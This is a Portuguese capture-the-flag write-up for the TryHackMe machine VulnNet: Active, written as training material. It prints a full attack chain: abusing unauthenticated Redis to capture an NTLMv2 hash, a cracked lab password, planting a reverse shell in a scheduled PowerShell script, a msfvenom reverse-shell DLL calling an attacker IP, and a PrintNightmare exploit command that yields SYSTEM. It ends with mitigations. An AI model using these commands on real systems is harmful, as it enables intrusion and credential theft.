# 📄 RELATÓRIO TÉCNICO – CTF VULNNET:ACTIVE (TryHackMe)

👤 **Autor:** c0rt3s
🎯 **Plataforma:** TryHackMe
🖥️ **Máquina:** VulnNet: Active
📌 **Tipo:** CTF – Windows / Active Directory / Privilege Escalation
⚙️ **Objetivo:** Comprometer a máquina e obter as flags do usuário e do sistema
📊 **Nível de dificuldade:** Médio
🧠 **Base de estudo:** Conteúdo e metodologia do curso da Desec Security

---

# 🎯 Objetivo do Lab

O objetivo deste laboratório foi comprometer a máquina **VulnNet: Active**, explorando vulnerabilidades em serviços expostos na rede e falhas de configuração em scripts automatizados.

Durante o processo foram utilizadas técnicas de:

* Reconhecimento de serviços
* Exploração de serviço Redis mal configurado
* Captura de hash NTLMv2
* Crack de credenciais
* Acesso SMB
* Execução remota via script automatizado
* Escalonamento de privilégios no Windows

A exploração culminou na obtenção de acesso **SYSTEM**, permitindo a captura das flags do usuário e do administrador.

---

# ⚔️ Resumo da Cadeia de Ataque

A exploração seguiu o seguinte fluxo:

```
Nmap Scan
      ↓
Identificação do serviço Redis
      ↓
Conexão Redis sem autenticação
      ↓
Forçar autenticação SMB
      ↓
Captura de hash NTLMv2 (Responder)
      ↓
Crack da hash
      ↓
Credencial enterprise-security
      ↓
Acesso SMB
      ↓
Descoberta de script PowerShell automatizado
      ↓
Modificação do script
      ↓
Reverse shell
      ↓
Acesso inicial ao Windows
      ↓
Enumeração do sistema
      ↓
Exploração PrintNightmare
      ↓
Reverse shell como SYSTEM
      ↓
Captura das flags
```

Essa cadeia demonstra uma exploração realista combinando **serviço mal configurado, credenciais expostas e vulnerabilidade crítica do Windows**.

---

# 🔍 Reconhecimento Inicial – Nmap

O primeiro passo foi identificar os serviços disponíveis na máquina alvo.

```
nmap -sC -sV -Pn 10.66.149.6
```

Portas identificadas:

```
53
135
139
445
464
6379
9389
49666
49668
49669
49670
49677
49692
```

A presença dessas portas indica um ambiente **Windows com Active Directory**.

Um serviço chamou atenção:

```
6379 → Redis
```

Esse serviço frequentemente aparece vulnerável quando mal configurado.

---

# 🧨 Exploração do Redis

Foi possível conectar ao Redis **sem autenticação**.

```
redis-cli -h 10.66.149.6
```

O acesso foi aceito imediatamente.

Isso indicava que o serviço estava **aberto e sem controle de acesso**.

---

# ⚙️ Escrita de Arquivos via Redis

Foi testado se o Redis permitia alterar o diretório de escrita.

```
CONFIG SET dir /
CONFIG SET dbfilename test
```

O comando funcionou, indicando que era possível **gravar arquivos arbitrários no sistema**.

---

# 🕵️ Captura de Hash NTLMv2

Utilizando o Redis foi possível forçar o servidor a tentar autenticar via SMB contra a máquina atacante.

Foi utilizado o **Responder** para capturar a autenticação.

O hash capturado foi:

```
enterprise-security::VULNNET:70b181d02cd47abf:DBDD87B7E9E021F5482DF517A9E207BC:...
```

---

# 🔓 Crack da Hash

A hash foi quebrada utilizando **Hashcat**, revelando a seguinte credencial:

```
Usuário: enterprise-security
Senha: sand_0873959498
```

---

# 📂 Enumeração SMB

Com a nova credencial foi realizada enumeração SMB.

```
smbclient -L //vulnet.thm -U enterprise-security
```

Um compartilhamento interessante foi identificado:

```
Enterprise-Share
```

---

# 📄 Script Encontrado

Ao acessar o compartilhamento foi encontrado o arquivo:

```
PurgeIrrelevantData_1826.ps1
```

Esse script PowerShell aparentava ser executado **automaticamente como parte de uma rotina do sistema**.

---

# 🧨 Injeção de Payload no Script

O script foi baixado e modificado para incluir um **reverse shell em PowerShell**.

Após a modificação ele foi enviado novamente ao servidor.

```
put PurgeIrrelevantData_1826.ps1
```

---

# 🎧 Listener na Máquina Atacante

Na máquina atacante foi iniciado um listener.

```
nc -lvnp 4444
```

Após algum tempo o script foi executado automaticamente e a conexão reversa foi recebida.

Isso resultou em uma **shell inicial no sistema Windows**.

---

# 🚩 Captura da Primeira Flag

Com acesso inicial foi possível navegar até o diretório do usuário:

```
C:\Users\enterprise-security\Desktop
```

Nesse diretório foi encontrada a flag:

```
user.txt
```

---

# 🔎 Enumeração do Sistema

Foi executado:

```
systeminfo
```

O sistema operacional identificado foi:

```
Windows Server 2019
Build 17763
```

Esse build é conhecido por ser vulnerável ao exploit **CVE-2021-1675**.

---

# 💣 Exploração PrintNightmare

A vulnerabilidade **PrintNightmare** permite que usuários autenticados instalem drivers de impressora maliciosos.

Isso resulta em **execução de código como SYSTEM**.

O exploit utilizado foi baseado em **Impacket**.

---

# 🧨 Criação do Payload

Foi criado um payload em DLL:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.145.249 LPORT=4445 -f dll -o shell.dll
```

---

# 🌐 Servidor SMB

Foi iniciado um servidor SMB para hospedar o payload.

```
impacket-smbserver share .
```

---

# 🎧 Listener SYSTEM

Foi iniciado um novo listener para receber a shell privilegiada.

```
nc -lvnp 4445
```

---

# 🚀 Execução do Exploit

O exploit foi executado utilizando as credenciais obtidas anteriormente.

```
python3 CVE-2021-1675.py vulnnet.local/enterprise-security:sand_0873959498@vulnet.thm '\\192.168.145.249\share\shell.dll'
```

Após a execução do exploit foi recebida uma nova conexão.

Usuário obtido:

```
NT AUTHORITY\SYSTEM
```

---

# 🏆 Captura da Flag Final

Com privilégios administrativos foi possível acessar o diretório do administrador.

```
C:\Users\Administrator\Desktop
```

A flag final encontrada foi:

```
root.txt
```

---

# 💥 Impacto de Segurança

Se essa vulnerabilidade estivesse presente em um ambiente corporativo real, um atacante poderia:

* obter credenciais de usuários do domínio
* comprometer servidores Windows
* escalar privilégios até SYSTEM
* executar código remotamente
* comprometer controladores de domínio

---

# 🛡️ Mitigações Recomendadas

Para evitar esse tipo de comprometimento, recomenda-se:

* restringir acesso ao serviço Redis
* implementar autenticação no Redis
* monitorar autenticações SMB suspeitas
* aplicar patches de segurança do Windows
* desabilitar o serviço Print Spooler quando não necessário
* monitorar execução de drivers de impressora

---

# 🧠 Conclusão

Este laboratório demonstrou uma cadeia de ataque realista envolvendo múltiplas falhas de segurança:

* serviço Redis exposto
* captura de hashes NTLMv2
* reutilização de credenciais
* scripts automatizados vulneráveis
* exploração da vulnerabilidade PrintNightmare

A exploração reforça a importância de boas práticas de segurança e demonstra na prática a aplicação das técnicas estudadas durante o treinamento da **Desec Security**.
